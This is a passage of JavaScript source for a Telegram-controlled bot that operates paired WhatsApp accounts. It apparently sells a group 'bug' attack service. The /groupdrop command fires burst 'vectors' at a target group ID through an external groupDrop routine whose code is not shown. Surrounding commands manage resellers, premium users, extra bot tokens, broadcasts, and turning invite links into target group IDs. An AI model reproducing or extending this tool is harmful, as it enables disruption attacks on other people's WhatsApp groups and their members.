                    `Vectors: <code>${summary}</code>`,
                    { parse_mode: 'HTML' }
                );
            } catch (err) {
                log('error', cmd, err.message);
                S7.sendMessage(chatId, `❌ ${err.message}`);
            }
        });

        // ============================================================
        // NEW GROUP BUG COMMAND
        // ============================================================

        // /groupdrop [group_id]@g.us
        SYLoVe(['groupdrop', 'gdropg', 'dropgroup'], async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const cmd = args[0].slice(1);
            const targetJid = args[1];

            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            const session = GetSessionForUser(userId, chatId);
            if (session.error) return S7.sendMessage(chatId, session.error);
            const client = session.sock;

            if (!targetJid || !targetJid.endsWith('@g.us')) {
                return S7.sendMessage(chatId,
                    `❌ Usage: /${cmd} <group_id>@g.us\n` +
                    `Example: /${cmd} 1234567890-1234567890@g.us`,
                    { parse_mode: 'HTML' }
                );
            }

            try {
                log('command', msg.from.first_name, `${cmd} → ${targetJid}`);

                await S7.sendPhoto(chatId, LoveLogo, {
                    caption: bvgNotice(targetJid, session.num, 'group · fan-out'),
                    parse_mode: 'HTML'
                });

                const report = await groupdropLogic.groupDrop(client, targetJid, {
                    bursts: 3,
                    gapMs: 700,
                    arm: true,
                });

                const summary = Object.entries(report.vectors)
                    .map(([k, v]) => `${k}:${v}`)
                    .join(' · ');

                S7.sendMessage(chatId,
                    `✅ <b>GROUPDROP DONE</b>\n` +
                    `Target: <code>${targetJid}</code>\n` +
                    `Admin rights: <b>${report.isAdmin ? 'YES' : 'NO'}</b>\n` +
                    `Privacy: <b>${report.privacyArmed}/7</b>\n` +
                    `Disappearing: <b>${report.disappearing ? 'ON' : 'OFF'}</b>\n` +
                    `Bursts: <b>${report.bursts}</b>\n` +
                    `Vectors: <code>${summary}</code>`,
                    { parse_mode: 'HTML' }
                );
            } catch (err) {
                log('error', cmd, err.message);
                S7.sendMessage(chatId, `❌ ${err.message}`);
            }
        });

        // ============================================================
        // GROUP UTILITIES
        // ============================================================

        SYLoVe('listgc', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();

            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

            if (!waSessions || Object.keys(waSessions).length === 0) {
                return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect');
            }

            let text = `⬣ <b>LIST OF WHATSAPP GROUPS</b>\n\n`;
            let totalGroups = 0;
            let index = 1;

            for (const chatKey of Object.keys(waSessions)) {
                for (const session of waSessions[chatKey]) {
                    const sock = session.sock;
                    const num = session.num;

                    try {
                        const groupsObj = await sock.groupFetchAllParticipating();
                        const groups = Object.values(groupsObj);
                        if (groups.length === 0) continue;

                        text += `📱 <b>Number:</b> <code>${num}</code>\n`;
                        text += `━━━━━━━━━━━━━━━\n`;

                        for (const group of groups) {
                            const meta = await sock.groupMetadata(group.id);
                            text += `❏ Group ${index++}\n`;
                            text += `│⭔ <b>Name:</b> ${meta.subject}\n`;
                            text += `│⭔ <b>ID:</b> <code>${meta.id}</code>\n`;
                            text += `│⭔ <b>Members:</b> ${meta.participants.length}\n`;
                            text += `╰──────────────\n\n`;
                            totalGroups++;
                        }
                    } catch (err) {
                        log('error', 'LISTGC', `Failed for ${num}: ${err.message}`);
                    }
                }
            }

            if (totalGroups === 0) {
                return S7.sendMessage(chatId, '❌ No groups found on connected numbers.');
            }

            text = `⬣ <b>LIST OF GROUP BELOW</b>\n\n` + `📦 <b>Total Groups:</b> ${totalGroups}\n\n` + text;

            if (text.length > 4000) {
                const filePath = './Love/listgc.txt';
                fs.writeFileSync(filePath, text.replace(/<[^>]*>/g, ''));
                return S7.sendDocument(chatId, filePath);
            }

            S7.sendMessage(chatId, text, { parse_mode: 'HTML' });
        });

        SYLoVe('groupid', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const link = args[1];

            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            const session = GetSessionForUser(userId, chatId);
            if (session.error) return S7.sendMessage(chatId, session.error);
            const client = session.sock;

            if (!link || !link.includes('chat.whatsapp.com/')) {
                return S7.sendMessage(chatId, `❌ Usage: /groupid [Group Link]\nExample: /groupid https://chat.whatsapp.com/Kzj...`);
            }

            try {
                const code = link.split('chat.whatsapp.com/')[1].trim();
                await S7.sendMessage(chatId, '🔍 <b>Scanning Link...</b>', { parse_mode: 'HTML' });
                const groupInfo = await client.groupGetInviteInfo(code);
                const text =
                    `🆔 <b>GROUP ID FOUND</b>\n` +
                    `────────────────────\n` +
                    `📌 <b>Name:</b> ${groupInfo.subject}\n` +
                    `🔑 <b>ID:</b> <code>${groupInfo.id}</code>\n` +
                    `👑 <b>Owner:</b> <code>${groupInfo.owner || 'Unknown'}</code>\n` +
                    `👥 <b>Size:</b> ${groupInfo.size || 'Unknown'}\n` +
                    `────────────────────\n` +
                    `<i>Click the ID to copy</i>`;
                await S7.sendMessage(chatId, text, { parse_mode: 'HTML' });
            } catch (err) {
                log('error', 'groupid', err.message);
                S7.sendMessage(chatId, `❌ <b>Invalid or Revoked Link</b>\nError: ${err.message}`, { parse_mode: 'HTML' });
            }
        });

        // ==================== MISC COMMANDS ====================

        SYLoVe('addtoken', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const newToken = args[1];
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!newToken) return S7.sendMessage(chatId, 'Usage: /addtoken <token>');
            let db = getDB();
            if (db.tokens.find(t => t.token === newToken)) return S7.sendMessage(chatId, '❌ Token already connected.');
            const myBotsCount = db.tokens.filter(t => t.owner === userId).length;
            if (myBotsCount >= 5) return S7.sendMessage(chatId, '🚫 Bot limit reached!\n\nYou can only add <b>5 bots maximum</b>.', { parse_mode: 'HTML' });
            try {
                const tempBot = new SY(newToken, { polling: false });
                const botInfo = await tempBot.getMe();
                db.tokens.push({ token: newToken, owner: userId });
                saveDB(db);
                startSYloveBot(newToken);
                S7.sendMessage(chatId, `✅ Token Connected\nBot: ${botInfo.first_name}\n@${botInfo.username}`);
            } catch (e) {
                S7.sendMessage(chatId, '❌ Invalid token.');
            }
        });

        SYLoVe('reqpair', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const number = args[1];
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!number) return S7.sendMessage(chatId, '❌ Provide a phone number.\nExample: /reqpair +234XXXXXXX');
            const cleanNumber = number.replace(/[^0-9]/g, '');
            await StartLovingSY(chatId, cleanNumber, S7);
        });

        SYLoVe('delpair', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const number = args[1];
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!number) return S7.sendMessage(chatId, '❌ Provide a phone number.\nExample: /delpair +234XXXXXXX');
            const cleanNumber = number.replace(/[^0-9]/g, '');
            const SYPaTH = `./Love/auth/${chatId}/${cleanNumber}`;
            if (fs.existsSync(SYPaTH)) {
                try {
                    fs.rmSync(SYPaTH, { recursive: true, force: true });
                    S7.sendMessage(chatId, `🗑️ Session deleted successfully for <b>${cleanNumber}</b>.`, { parse_mode: 'HTML' });
                } catch (err) {
                    S7.sendMessage(chatId, `❌ Failed to delete session: ${err.message}`);
                }
            } else {
                S7.sendMessage(chatId, `⚠️ No session found for <b>${cleanNumber}</b>.`, { parse_mode: 'HTML' });
            }
        });

        SYLoVe('deltoken', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const delToken = args[1];
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!delToken) return S7.sendMessage(chatId, 'Usage: /deltoken <token>');
            let db = getDB();
            const tokenObj = db.tokens.find(t => t.token === delToken);
            if (!tokenObj || tokenObj.owner !== userId) return S7.sendMessage(chatId, '❌ No connected token found.');
            db.tokens = db.tokens.filter(t => t.token !== delToken);
            saveDB(db);
            if (activeBots[delToken]) {
                await activeBots[delToken].stopPolling();
                delete activeBots[delToken];
            }
            log('info', `Token deleted: ${delToken.substring(0, 10)}...`);
            S7.sendMessage(chatId, '✅ Token deleted successfully.');
        });

        SYLoVe('mytoken', async (msg) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id.toString();
            let db = getDB();
            const myTokens = db.tokens.filter(t => t.owner === userId);
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (myTokens.length === 0) return S7.sendMessage(chatId, '❌ You have not added any tokens.');
            let text = '<b>Your Connected Bots</b>\n────────────────────\n\n';
            let count = 1;
            for (const item of myTokens) {
                try {
                    const bot = new SY(item.token, { polling: false });
                    const info = await bot.getMe();
                    text += `<b>${count}. ${info.first_name}</b>\n👤 Username: <b>@${info.username}</b>\n🔑 Token:\n<code>${item.token}</code>\n────────────────────\n\n`;
                } catch {
                    text += `<b>${count}. ⚠️ Unknown Bot</b>\n🔑 Token:\n<code>${item.token}</code>\n────────────────────\n\n`;
                }
                count++;
            }
            S7.sendMessage(chatId, text, { parse_mode: 'HTML' });
        });

        SYLoVe('addresell', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (chatId !== config.adminId) return S7.sendMessage(chatId, unauthorized);
            const targetId = msg.text.split(' ')[1];
            if (!targetId) return S7.sendMessage(chatId, 'Usage: /addresell ID');
            let db = getDB();
            if (db.resellers.includes(targetId)) return S7.sendMessage(chatId, 'User is already a Reseller.');
            db.resellers.push(targetId);
            saveDB(db);
            S7.sendMessage(chatId, `✅ ID ${targetId} added as Reseller.`);
        });

        SYLoVe('delresell', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (chatId !== config.adminId) return S7.sendMessage(chatId, unauthorized);
            const targetId = msg.text.split(' ')[1];
            if (!targetId) return S7.sendMessage(chatId, 'Usage: /delresell ID');
            let db = getDB();
            if (!db.resellers.includes(targetId)) return S7.sendMessage(chatId, 'User is not a Reseller.');
            db.resellers = db.resellers.filter(id => id !== targetId);
            saveDB(db);
            S7.sendMessage(chatId, `✅ ID ${targetId} removed from Resellers.`);
        });

        SYLoVe('listresell', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (chatId !== config.adminId) return S7.sendMessage(chatId, unauthorized);
            let db = getDB();
            if (db.resellers.length === 0) return S7.sendMessage(chatId, 'No resellers found.');
            let text = 'Reseller List:\n\n';
            for (let i = 0; i < db.resellers.length; i++) {
                const id = db.resellers[i].toString();
                try {
                    const user = await S7.getChat(id);
                    const username = user.username ? `@${user.username} : ` : '';
                    text += `${i + 1}. ${username}<code>${id}</code>\n`;
                } catch {
                    text += `${i + 1}. \`${id}\`\n`;
                }
            }
            text += '\n──────────────────';
            S7.sendMessage(chatId, text, { parse_mode: 'HTML' });
        });

        SYLoVe('broadcast', async (msg) => {
            const chatId = msg.chat.id.toString();
            if (chatId !== config.adminId) return S7.sendMessage(chatId, unauthorized);
            const userFile = path.join(LoveDir, 'user.json');
            if (!fs.existsSync(userFile)) return S7.sendMessage(chatId, '❌ No user database found. Wait for users to /start the bot.');
            const users = JSON.parse(fs.readFileSync(userFile));
            if (users.length === 0) return S7.sendMessage(chatId, '❌ No users found in database.');
            const args = msg.text.split(' ').slice(1).join(' ');
            const replyMsg = msg.reply_to_message;
            if (!args && !replyMsg) {
                return S7.sendMessage(chatId, '<b>Usage:</b>\n1. <code>/broadcast Your Message</code>\n2. Reply to an image/video with <code>/broadcast</code>', { parse_mode: 'HTML' });
            }
            const statusMsg = await S7.sendMessage(chatId, `📣 <b>Starting Broadcast...</b>\n\n👥 Target Users: ${users.length}`, { parse_mode: 'HTML' });
            let success = 0, failed = 0;
            for (const user of users) {
                try {
                    if (replyMsg) await S7.copyMessage(user.id, chatId, replyMsg.message_id);
                    else await S7.sendMessage(user.id, args, { parse_mode: 'HTML' });
                    success++;
                } catch { failed++; }
                await new Promise(resolve => setTimeout(resolve, 50));
            }
            await S7.editMessageText(`✅ <b>Broadcast Completed</b>\n\n👥 Total Users: <code>${users.length}</code>\n📨 Success: <code>${success}</code>\n🚫 Failed/Blocked: <code>${failed}</code>`, {
                chat_id: chatId,
                message_id: statusMsg.message_id,
                parse_mode: 'HTML'
            });
        });

        SYLoVe('addprem', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            let db = getDB();
            const isOwner = chatId === config.adminId;
            const isReseller = db.resellers.includes(chatId);
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!isOwner && !isReseller) return S7.sendMessage(chatId, unauthorized);
            const targetId = msg.text.split(' ')[1];
            if (!targetId) return S7.sendMessage(chatId, 'Usage: /addprem ID');
            if (db.premium.includes(targetId)) return S7.sendMessage(chatId, 'User is already Premium.');
            db.premium.push(targetId);
            saveDB(db);
            S7.sendMessage(chatId, `⭐ ID ${targetId} added to Premium.`);
        });

        SYLoVe('delprem', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            let db = getDB();
            const isOwner = chatId === config.adminId;
            const isReseller = db.resellers.includes(chatId);
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!isOwner && !isReseller) return S7.sendMessage(chatId, unauthorized);
            const targetId = msg.text.split(' ')[1];
            if (!targetId) return S7.sendMessage(chatId, 'Usage: /delprem ID');
            if (!db.premium.includes(targetId)) return S7.sendMessage(chatId, 'User is not Premium.');
            db.premium = db.premium.filter(id => id !== targetId);
            saveDB(db);
            S7.sendMessage(chatId, `🗑️ ID ${targetId} removed from Premium.`);
        });

        SYLoVe('listprem', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (chatId !== config.adminId) return S7.sendMessage(chatId, unauthorized);
            let db = getDB();
            if (db.premium.length === 0) return S7.sendMessage(chatId, 'No premium users found.');
            let text = 'Premium List:\n\n';
            for (let i = 0; i < db.premium.length; i++) {
                const id = db.premium[i].toString();
                try {
                    const user = await S7.getChat(id);
                    const username = user.username ? `@${user.username} : ` : '';
                    text += `${i + 1}. ${username}<code>${id}</code>\n`;
                } catch {
                    text += `${i + 1}. \`${id}\`\n`;
                }
            }
            text += '\n──────────────────';
            S7.sendMessage(chatId, text, { parse_mode: 'HTML' });
        });

        SYLoVe('state', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const value = args[1];
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (chatId !== config.adminId) return S7.sendMessage(chatId, unauthorized);
            if (value !== '0' && value !== '1') return S7.sendMessage(chatId, 'Usage: /state 0 | 1');
            let db = getDB();
            db.state = Number(value);
            saveDB(db);
            S7.sendMessage(chatId, value === '0' ? '✅ State set to FREE MODE (All users allowed)' : '🔒 State set to PREMIUM ONLY MODE');
        });

        SYLoVe('listuser', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (msg.chat.id.toString() !== config.adminId) return S7.sendMessage(msg.chat.id, unauthorized);
            const userFile = path.join(LoveDir, 'user.json');
            if (!fs.existsSync(userFile)) return S7.sendMessage(msg.chat.id, 'No users found.');
            const users = JSON.parse(fs.readFileSync(userFile));
            let list = 'User List:\n\n';
            users.forEach((u, i) => { list += `${i + 1}. ${u.name} (${u.id})\n`; });
            if (list.length > 4000) {
                const listPath = path.join(LoveDir, 'list.txt');
                fs.writeFileSync(listPath, list);
                S7.sendDocument(msg.chat.id, listPath);
            } else {
                S7.sendMessage(msg.chat.id, list);
            }
        });

    } catch (err) {
        log('error', 'STARTUP', `Could not start bot with token: ${token.substring(0, 10)}...`);
    }
}

// Start Bot
startSYloveBot(config.mainToken);

// Start Extra Bots
const db = getDB();
if (db.tokens && db.tokens.length > 0) {
    db.tokens.forEach(obj => startSYloveBot(obj.token));
} else {
    log('info', null, 'No extra bots found in database.');
                    }
